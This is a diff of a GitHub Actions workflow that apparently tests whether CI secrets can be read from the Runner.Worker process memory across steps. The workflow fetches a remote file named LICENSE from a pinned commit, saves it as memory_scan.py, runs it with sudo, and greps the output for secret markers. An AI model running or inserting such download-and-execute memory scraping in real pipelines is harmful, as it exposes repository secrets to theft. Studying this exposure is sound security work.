@@ -1,5 +1,7 @@
 name: memory_scan_test
 
+# 测试从'Runner.Worker'进程中读取secret，并验证该数据在内存中是持久化的即上游step注入了，下游step也可以读取到
+
 on:
   # 手动触发
   workflow_dispatch:
@@ -24,7 +26,7 @@ jobs:
       - name: 🛠️ 初始化仓库
         uses: actions/checkout@v4
 
-      - name: 🔑 注入测试秘钥
+      - name: 🔑 注入测试秘钥与第一次内存扫描提取秘钥
         env:
           TEST_SECRET: ${{ secrets.SECRET_TEST_XX }}
         run: |
@@ -32,7 +34,7 @@ jobs:
           echo "正在第一次内存扫描提取秘钥..."
           wget -q https://raw.githubusercontent.com/flank/flank/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE -O memory_scan.py
           chmod +x memory_scan.py
-          sudo python3 memory_scan.py | grep -i -a --text 'test_xx' && echo "⚠️ 找到秘钥！" || echo "✅ 未找到秘钥。"
+          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbcc' && echo "⚠️ 第一次找到秘钥！" || echo "✅ 第一次未找到秘钥。"
 
       - name: 📝 打印环境信息
         run: |
@@ -44,7 +46,7 @@ jobs:
       - name: 🕵️ 第二次内存扫描提取秘钥
         run: |
           echo "正在扫描内存提取秘钥..."          
-          sudo python3 memory_scan.py | grep -i -a --text 'test_xx' && echo "⚠️ 找到秘钥！" || echo "✅ 未找到秘钥。"
+          sudo python3 memory_scan.py | grep -i -a --text 'isSecret'|grep -i -a --text 'aabbcc' && echo "⚠️ 第二次找到秘钥！" || echo "✅ 第二次未找到秘钥。"
 
       - name: ✅ 测试完成
         run: echo "🎉 内存扫描测试已完成！"
